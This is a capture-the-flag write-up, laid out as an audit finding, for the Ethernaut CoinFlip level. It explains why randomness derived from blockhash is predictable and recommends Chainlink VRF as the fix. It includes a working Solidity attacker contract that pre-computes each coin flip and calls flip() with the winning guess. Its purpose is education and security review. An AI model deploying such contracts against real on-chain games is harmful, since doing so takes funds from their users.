#### This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

## Summary
The coin flip depends on this calculation alone `uint256 coinFlip = blockValue / FACTOR`.
The values are as following:

`blockValue = uint256(blockhash(block.number - 1))`

`uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968`

This can be easily exploited since the blockValue can be easily computed on-chain by another contract.

## Vulnerability Detail
Since both values are known, they can be used by a malicious contract on-chain, to actually pre-compute the value of `true`/`false` and directly call the `flip()` function of `CoinFlip`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ICoinFlip.sol";

contract CoinFlipAttacker {
    address public coinFlipAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function attackFlip() public {
        ICoinFlip coinFlipContract = ICoinFlip(coinFlipAddress);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
```

Attack scenario:
1. An attacker deploys a malicious contract `CoinFlipAttacker.sol`. It has a function `attackFlip()` which performs the attack.
2. The attacker then calls the `CoinFlipAttacker::attackFlip` function. It pre-computes the `coinFlip` and calls `CoinFlip::flip` with that value.
3. The attacker always gets the correct flip.

## Impact
High. This breaks a core contract functionality. It is not constrained at all and everyone can easily exploit it.

## Code Snippet
https://github.com/danielvichinyan/ethernaut-solutions/blob/main/coinflip/CoinFlip.sol#L13-L31

## Tools Used
Remix IDE, Manual Review

## Recommendation
Incorporate external randomness. Use an Oracle service like Chainlink VRF (Verifiable Random Function) to get a truly random `FACTOR` number.
